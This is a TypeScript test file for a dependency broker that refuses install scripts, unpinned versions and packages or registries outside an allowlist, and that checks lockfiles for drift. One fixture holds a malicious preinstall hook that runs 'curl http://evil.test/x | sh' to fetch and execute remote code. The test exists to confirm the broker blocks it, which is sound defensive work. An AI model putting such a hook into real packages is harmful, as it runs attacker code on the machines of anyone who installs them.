import { describe, expect, it } from 'vitest';

import {
  DependencyBroker,
  LockfileDriftError,
  MaliciousInstallScriptError,
  UnpinnedResolutionError,
} from '../../src/modules/dependencies/index.js';

/**
 * WP3-04 / T1-7 — dependency broker negatives (NEG3-10).
 *
 * The broker owns dependency acquisition, refuses lifecycle scripts and
 * unpinned versions, and writes the lockfile rather than trusting candidate
 * output. These tests exercise the deterministic broker contract; the separate
 * native acquisition sandbox check remains required for full WP3-04 proof.
 */
const broker = (): DependencyBroker =>
  new DependencyBroker({
    allowlistedRegistries: ['https://registry.npmjs.org'],
    allowlistedPackages: ['left-pad'],
    installScriptsAllowed: false,
  });

const manifest = (overrides: Record<string, unknown> = {}) => ({
  name: 'left-pad',
  version: '1.3.0',
  integrity: 'sha512-abc',
  scripts: {},
  ...overrides,
});

const request = (overrides: Record<string, unknown> = {}) => ({
  packageName: 'left-pad',
  version: '1.3.0',
  manifest: manifest(),
  registry: 'https://registry.npmjs.org',
  ...overrides,
});

describe('dependency broker refuses unsafe requests', () => {
  it('refuses a package whose manifest declares a lifecycle install script (NEG3-10)', () => {
    const resolveEvilPackage = () =>
      broker().resolve(
        request({
          packageName: 'evil-package',
          manifest: manifest({
            name: 'evil-package',
            scripts: {
              preinstall: 'node -e "require(\'child_process\').exec(\'curl http://evil.test/x | sh\')"',
            },
          }),
        }),
      );

    expect(resolveEvilPackage).toThrow(MaliciousInstallScriptError);
    try {
      resolveEvilPackage();
    } catch (error) {
      expect(error).toBeInstanceOf(MaliciousInstallScriptError);
      expect((error as MaliciousInstallScriptError).scriptName).toBe('preinstall');
    }
  });

  it('refuses a package outside the allowlist', () => {
    expect(() => broker().resolve(request({ packageName: 'not-allowed', manifest: manifest({ name: 'not-allowed' }) })))
      .toThrow(/allowlist/i);
  });

  it('refuses a registry outside the allowlist', () => {
    expect(() => broker().resolve(request({ registry: 'https://evil.registry.test' }))).toThrow(/registry/i);
  });

  it('refuses an unpinned version', () => {
    expect(() => broker().resolve(request({ version: 'latest', manifest: manifest({ version: 'latest' }) })))
      .toThrow(UnpinnedResolutionError);
  });

  it('refuses a package whose version range is not exact', () => {
    expect(() => broker().resolve(request({ version: '^1.0.0' }))).toThrow(/exact/i);
  });
});

describe('dependency broker produces a lockfile the candidate cannot author', () => {
  it('resolves an allowlisted, pinned package', () => {
    const resolution = broker().resolve(request());

    expect(resolution.packageName).toBe('left-pad');
    expect(resolution.version).toBe('1.3.0');
    expect(resolution.integrity).toBe('sha512-abc');
    expect(resolution.installScriptExecuted).toBe(false);
  });

  it('generates a lockfile entry the broker owns', () => {
    const lockfile = broker().writeLockfile([broker().resolve(request())]);

    expect(lockfile.lockfileVersion).toBe(1);
    expect(lockfile.packages['left-pad@1.3.0']?.integrity).toBe('sha512-abc');
    expect(lockfile.packages['left-pad@1.3.0']?.resolvedFrom).toBe('https://registry.npmjs.org');
  });

  it('detects lockfile drift when the resolved set changes', () => {
    const dependencyBroker = broker();
    const original = dependencyBroker.writeLockfile([dependencyBroker.resolve(request())]);
    const changed = dependencyBroker.writeLockfile([
      dependencyBroker.resolve(
        request({ version: '1.3.1', manifest: manifest({ version: '1.3.1', integrity: 'sha512-different' }) }),
      ),
    ]);

    expect(() => {
      dependencyBroker.assertNoDrift(original, changed);
    }).toThrow(LockfileDriftError);
    try {
      dependencyBroker.assertNoDrift(original, changed);
    } catch (error) {
      expect((error as LockfileDriftError).drifted).toContain('left-pad@1.3.0');
      expect((error as LockfileDriftError).details.join(' ')).toContain('left-pad');
    }
  });

  it('reports no drift when the resolved set is identical', () => {
    const dependencyBroker = broker();
    const original = dependencyBroker.writeLockfile([dependencyBroker.resolve(request())]);
    const same = dependencyBroker.writeLockfile([dependencyBroker.resolve(request())]);

    expect(() => {
      dependencyBroker.assertNoDrift(original, same);
    }).not.toThrow();
  });

  it('refuses to write a lockfile for a resolution with no integrity digest', () => {
    const dependencyBroker = broker();
    const resolution = dependencyBroker.resolve(
      request({ manifest: manifest({ integrity: undefined }) }),
    );

    expect(() => dependencyBroker.writeLockfile([resolution])).toThrow(/integrity/i);
  });
});
